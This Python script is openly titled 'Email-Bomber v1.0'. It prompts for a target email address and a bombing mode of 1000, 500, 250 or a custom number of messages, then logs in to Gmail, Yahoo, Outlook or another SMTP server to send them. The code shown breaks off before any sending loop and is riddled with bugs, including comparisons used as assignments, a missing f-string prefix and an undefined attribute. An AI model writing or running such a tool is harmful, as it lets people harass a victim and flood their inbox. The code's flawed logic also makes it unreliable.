import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + '+[+[+ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
           ________  __       __   ______   ______  __                                                                   
      /        |/  \     /  | /      \ /      |/  |                                                                  
      $$$$$$$$/ $$  \   /$$ |/$$$$$$  |$$$$$$/ $$ |                                                                  
      $$ |__    $$$  \ /$$$ |$$ |__$$ |  $$ |  $$ |                                                                  
      $$    |   $$$$  /$$$$ |$$    $$ |  $$ |  $$ |                                                                  
      $$$$$/    $$ $$ $$/$$ |$$$$$$$$ |  $$ |  $$ |                                                                  
      $$ |_____ $$ |$$$/ $$ |$$ |  $$ | _$$ |_ $$ |_____                                                             
      $$       |$$ | $/  $$ |$$ |  $$ |/ $$   |$$       |                                                            
      $$$$$$$$/ $$/      $$/ $$/   $$/ $$$$$$/ $$$$$$$$/                                                             
                                                                                                                     
                                                                                                                     
                                                                                                                     
 _______                           __             __  _______                           __                           
/       \                         /  |           /  |/       \                         /  |                          
$$$$$$$  |  ______   _____  ____  $$ |____      /$$/ $$$$$$$  |  ______   _____  ____  $$ |____    ______    ______  
$$ |__$$ | /      \ /     \/    \ $$      \    /$$/  $$ |__$$ | /      \ /     \/    \ $$      \  /      \  /      \ 
$$    $$< /$$$$$$  |$$$$$$ $$$$  |$$$$$$$  |  /$$/   $$    $$< /$$$$$$  |$$$$$$ $$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$$$$$$  |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ | /$$/    $$$$$$$  |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
$$ |__$$ |$$ \__$$ |$$ | $$ | $$ |$$ |__$$ |/$$/     $$ |__$$ |$$ \__$$ |$$ | $$ | $$ |$$ |__$$ |$$$$$$$$/ $$ |      
$$    $$/ $$    $$/ $$ | $$ | $$ |$$    $$//$$/      $$    $$/ $$    $$/ $$ | $$ | $$ |$$    $$/ $$       |$$ |      
$$$$$$$/   $$$$$$/  $$/  $$/  $$/ $$$$$$$/ $$/       $$$$$$$/   $$$$$$/  $$/  $$/  $$/ $$$$$$$/   $$$$$$$/ $$/       



                                                                                @@@@@@@@                        
                                                                @@@@       @@@                      
                                                              @@+          @@                       
                                                      =@@@@@@@        #@@@ @@.                      
                                           %@@@@@@@@@@@    -@     @@@@+   @@                        
                                      :@@@           +  ::-.    @@@+                                
                                    @@:    ::::::::.@  :::-@   @%  @=                               
                                  @@   ::::::::::::.+@  :::=@@@*:: =@                               
                           .@@@.@@   ::::::::::::::.. @ ..:::::::: @                                
                           @   @@. ::::::::::::::::::  .@..  .:... @@                               
                          @*     @@=.:::::::::.   ..:::..%@@@@@@@.. :@                              
                          @        @@=..  -@@@@@@@@*::::@@      @@@.  @                             
                          @          @% @@@        @.:::@         @@: @@                            
                          @           # @          @.:::@          @:  @                            
                          @    @     @# @          @.:::@          @:: @:                           
                           @  .@     @  #@ .@@    @=::::@@         @:: =@                           
                           @@@    @@@=:::@  @:   @*.:::::@@@      @@::  @                            
                           @ .%@@@#  :::.+=@@  @@* :::::::@@   @@@@::: =@                           
                           @  ::::::::::::  -#%=..::::::::@      @:::: @=                           
                            @    .::::::::::::.      :::::@      @:::  @                            
                            @@@@@@@@@@@@@@@@@@@@@@@@ :::::@@@   @@::: @@                            
                            *@                     @ :::::::@@@@@::.  @                             
                             @@            @     @@# :::::::::::::. +@                              
                              @@  @@@@    @ @@  @@  :::::::::::::  @@                               
                               .@@@   @@@    @@@@  ::::::::::::   @@                                
                                  @+@         @   :::::::::::   @@                                  
                                   :@@%@@@@@@@# :::::::::     @@                                    
                                      +@@%                @@@-                                      
                                           %@@@@@@@@@@@@*                       Auther : The_Black_Riven     
                                                                                github : https://github.com/anassalien123/
*/------------------------------------------------------------------------------------------------------------------------/*
*/------------------------------------------------------------------------------------------------------------------------/*
*/------------------------------------------------------------------------------------------------------------------------/*
*/------------------------------------------------------------------------------------------------------------------------/*
    ''')

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = str(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('Error: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'Error: {e}')
    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Settting up  bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount == int(1000)
            elif self.mode == int(2):
                self.amount == int(500)
            elif self.amount == int(3):
                self.amount == int(250)
            else:
                self.amount = int(input('Choose a CUSTOM amount <: '))
            print(bcolors.RED + '\n+[+[+[ You have selected BOMB mode : {self.mode} and {self.amout} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')
    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.RED + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1','2','3']
            defaulth_port = True
            if self.server not in premade:
                defaulth_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if defaulth_port == True: # this problem
                self.port = int(587)
            
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.formAddr = str(input(bcolors.GREEN + 'Enter form address <: '))
            self.formPwd = str(input(bcolors.GREEN + 'Enter form password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubect %s\n%s\n
            ''' % (self.formAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fr, self.formPwd)

        except Exception as e:
            print(f'ERROR: {e}')